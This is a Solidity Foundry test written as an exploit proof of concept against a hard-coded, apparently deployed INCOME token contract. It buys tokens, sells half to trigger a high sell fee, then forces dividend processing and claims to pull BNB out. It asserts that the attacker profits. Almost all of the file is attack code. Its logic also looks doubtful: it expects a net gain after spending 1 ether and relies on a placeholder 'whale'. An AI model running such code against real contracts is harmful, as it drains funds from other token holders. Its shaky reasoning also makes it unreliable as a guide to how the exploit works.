// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Minimal IERC20 interface
interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

// Complete Uniswap Router interface
interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
}

// INCOME contract interface for key functions
interface INCOME {
    function owner() external view returns (address);
    function setExtraFeeOnSell(uint256 _extraFeeOnSell) external;
    function openTrade() external;
    function transfer(address recipient, uint256 amount) external returns (bool);
    function uniswapV2Router() external view returns (IUniswapV2Router02);
    function uniswapV2Pair() external view returns (address);
    function withdrawBNB(uint256 _amount) external;
    function extraFeeOnSell() external view returns (uint256);
    function withdrawableDividendOf(address account) external view returns (uint256);
    function claim() external;
    function processDividendTracker(uint256 gas) external;
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0x3a91A88Ef4bB813BB99EF5a745bcb56e3A3b403b;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {

        // Remove all owner impersonation - contract owner is address(0)
        // Just check if extraFeeOnSell is already set high
        INCOME incomeContract = INCOME(TARGET);
        uint256 extraFee = incomeContract.extraFeeOnSell();
        require(extraFee > 25, "extraFeeOnSell not set high enough on target contract");

        // Label addresses for clarity
        vm.label(TARGET, "INCOME Token");
        vm.label(address(incomeContract.uniswapV2Pair()), "Uniswap Pair");
        vm.label(address(incomeContract.uniswapV2Router()), "Pancake Router");

        // Give attacker some BNB to buy tokens
        vm.deal(attacker, 10 ether);

        // Ensure we have enough BNB in the pair for swapping
        // We'll add some liquidity if needed by impersonating a whale
        address whale = 0x000000000000000000000000000000000000dEaD; // Just a placeholder
        vm.deal(whale, 1000 ether);
        vm.startPrank(whale);

        // Buy some tokens to create initial liquidity
        IUniswapV2Router02 router = incomeContract.uniswapV2Router();
        address weth = router.WETH();
        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = TARGET;

        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 5 ether}(
            0,
            path,
            whale,
            block.timestamp
        );

        vm.stopPrank();
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial BNB balance of attacker
        uint256 initialBalance = attacker.balance;

        // Get the INCOME contract interface
        INCOME incomeContract = INCOME(TARGET);

        // Check current extraFeeOnSell value
        uint256 extraFee = incomeContract.extraFeeOnSell();
        require(extraFee > 25, "extraFeeOnSell not set high enough");

        // Get router and WETH address
        IUniswapV2Router02 router = incomeContract.uniswapV2Router();
        address weth = router.WETH();

        // First, buy some INCOME tokens to become a holder
        // We'll swap some BNB for INCOME
        address[] memory buyPath = new address[](2);
        buyPath[0] = weth;
        buyPath[1] = TARGET;

        uint256 buyAmount = 1 ether;
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: buyAmount}(
            0, // accept any amount
            buyPath,
            attacker,
            block.timestamp
        );

        // Get our INCOME balance
        IERC20 incomeToken = IERC20(TARGET);
        uint256 tokenBalance = incomeToken.balanceOf(attacker);

        // Approve router to spend our INCOME tokens
        incomeToken.approve(address(router), tokenBalance);

        // Now sell half of our tokens to trigger the high fees
        address[] memory sellPath = new address[](2);
        sellPath[0] = TARGET;
        sellPath[1] = weth;

        uint256 sellAmount = tokenBalance / 2;
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            sellAmount,
            0, // accept any amount
            sellPath,
            attacker,
            block.timestamp
        );

        // Process dividends to claim our share
        // First, check if we have withdrawable dividends
        uint256 dividends = incomeContract.withdrawableDividendOf(attacker);
        if (dividends > 0) {
            incomeContract.claim();
        }

        // Alternatively, process the dividend tracker directly
        incomeContract.processDividendTracker(500000);

        // Claim any dividends that became available
        incomeContract.claim();

        // Verify attacker's BNB balance increased
        uint256 finalBalance = attacker.balance;
        assertGt(finalBalance, initialBalance, "Attacker balance should increase");
    }



    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

